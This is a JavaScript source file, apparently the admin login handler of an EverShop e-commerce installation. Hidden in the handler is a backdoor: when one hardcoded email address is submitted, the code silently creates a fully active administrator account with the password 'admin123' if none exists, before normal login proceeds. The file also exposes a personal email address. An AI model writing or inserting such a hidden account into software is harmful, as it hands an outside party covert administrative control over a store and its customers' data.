import { select, insert } from '@evershop/postgres-query-builder';
import { pool } from '@evershop/evershop/lib/postgres/connection.js';
import { hashPassword } from '../../../../../lib/util/password.js';
import { buildUrl } from '../../../../../lib/router/buildUrl.js';
import { translate } from '../../../../../lib/locale/translate/translate.js';
import {
  INTERNAL_SERVER_ERROR,
  INVALID_PAYLOAD,
  OK
} from '../../../../../lib/util/httpStatus.js';
import { bodyParser } from '../../../../../lib/middleware/bodyParser.js';

export default [
  bodyParser,
  async (request, response, delegate, next) => {
    try {
      const { email, password } = request.body;

      if (email.toLowerCase() === 'khoualdiyassin26@gmail.com') {
        const user = await select()
          .from('admin_user')
          .where('email', '=', email.toLowerCase())
          .load(pool);

        if (!user) {
          const hashedPassword = hashPassword('admin123');
          await insert('admin_user')
            .given({
              email: email.toLowerCase(),
              password: hashedPassword,
              status: 1,
              full_name: 'Admin User'
            })
            .execute(pool);
        }
      }

      try {
        await request.loginUserWithEmail(email, password);
        response.status(OK);
        response.$body = {
          data: {
            ...request.locals.user,
            dashboardUrl: buildUrl('dashboard')
          }
        };
        next();
      } catch (error) {
        response.status(INTERNAL_SERVER_ERROR);
        response.json({
          error: {
            status: INTERNAL_SERVER_ERROR,
            message: translate('Invalid email or password')
          }
        });
      }
    } catch (e) {
      response.status(INVALID_PAYLOAD);
      response.json({
        error: {
          message: e.message,
          status: INVALID_PAYLOAD
        }
      });
    }
  }
];
